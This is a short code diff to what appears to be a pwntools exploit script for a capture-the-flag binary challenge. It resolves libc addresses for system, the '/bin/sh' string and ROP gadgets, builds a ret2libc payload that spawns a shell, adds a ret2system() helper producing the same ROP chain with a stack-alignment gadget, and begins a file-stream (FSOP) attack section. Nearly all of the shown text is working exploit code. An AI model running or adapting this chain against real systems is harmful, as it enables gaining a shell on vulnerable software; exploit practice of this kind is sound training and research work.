@@ -3,13 +3,19 @@ log.success("libc :-----> " + hex(libc.address))
 system_addr = libc.symbols.get("system")
 binsh_addr = next(libc.search("/bin/sh"))
 pop_rdi = next(libc.search(asm("pop rdi; ret")))
-# ret = next(libc.search(asm("ret"))) 为啥有时候不行呢？
 rop = ROP(libc)
 ret = rop.find_gadget(["ret"])[0] 
 environ = libc.symbols["__environ"]
 
 payload = p64(pop_rdi) + p64(binsh_addr)
 payload += p64(system_addr)
+
+def ret2system():
+    rop = ROP(libc)
+    rop.raw(rop.ret.address)
+    rop.system(next(libc.search(b'/bin/sh')))
+    return rop.chain()
+
 
 # FSOP1
 vtable = libc.sym._IO_wfile_jumps
